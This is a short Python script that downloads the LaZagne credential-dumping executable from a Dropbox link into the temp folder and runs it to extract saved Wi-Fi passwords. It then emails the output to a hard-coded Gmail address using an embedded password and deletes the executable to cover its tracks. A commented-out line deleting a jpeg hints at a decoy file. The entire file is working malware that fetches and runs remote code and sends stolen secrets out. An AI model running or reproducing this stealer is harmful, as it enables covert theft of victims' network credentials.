import requests
import subprocess
import smtplib
import os
import tempfile
import re

def send_mail(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

def download(url):
    request = requests.get(url)
    # file_name = url.split("/")
    # print(file_name[-1])
    with open("lazagne.exe","wb") as out_file:
        out_file.write(request.content)



temp_directory = tempfile.gettempdir()
os.chdir(temp_directory) 
download("https://uc9718bf8fa37c5c2627ff835e6a.dl.dropboxusercontent.com/cd/0/get/A3PYei5ZLi65UMT7uwvJYfnkOpjb2nb1XZmdzunFRrxpe0y_DKuZq-eZOq8SdTcfgiSTqANPygUHGSq-UM3bLmWfPp8xQlTtpfai33YVpmiWr2lIxbNVYj-rllpwEuH3jA8/file")
command = subprocess.check_output("lazagne.exe wifi")
send_mail("abdullahunderscore1112015@gmail.com","$hipuddenabc123",command)
os.remove("lazagne.exe")
# os.remove("pexels-photo-112460.jpeg")